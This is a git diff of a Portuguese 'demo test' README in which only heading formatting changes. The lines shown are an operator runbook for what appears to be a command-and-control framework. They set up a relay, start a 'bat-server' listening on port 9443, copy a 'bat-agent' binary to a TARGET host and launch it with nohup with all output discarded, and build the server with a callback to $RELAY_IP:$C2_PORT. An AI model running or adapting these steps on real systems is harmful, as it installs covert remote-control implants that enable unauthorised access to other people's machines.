@@ -1,4 +1,4 @@
-#versão demo de teste
+# versão demo de teste
 
 ## operador
 ```bash
@@ -15,7 +15,7 @@ ssh ubuntu@$RELAY_IP 'cd /tmp/bat && sudo bash relay/setup.sh --secret <SECRET>'
 ./relay/sync.sh ubuntu@$RELAY_IP --key $BAT_KEY --restart-kcc  # push kperf-qos + kcc scripts
 ```
 
-## liga o server
+## ligar o server
 ```bash
 ./bin/bat-server-v10-arm64 -listen 0.0.0.0:9443 -relay host@$RELAY_IP -key $BAT_KEY
 ```
@@ -26,7 +26,7 @@ scp -i $BAT_KEY ./bin/bat-agent-v10-x86_64 ubuntu@TARGET:/home/ubuntu/
 ssh -i $BAT_KEY ubuntu@TARGET 'chmod +x /home/ubuntu/bat-agent-v10-x86_64 && nohup /home/ubuntu/bat-agent-v10-x86_64 >/dev/null 2>&1 &'
 ```
 
-##rebuild servidor
+## rebuild servidor
 ```bash
 source build.env && cd agent && make -B server-arm64 \
   SERVER="$RELAY_IP:$C2_PORT" FALLBACK="$RELAY_IP:$C2_PORT" \
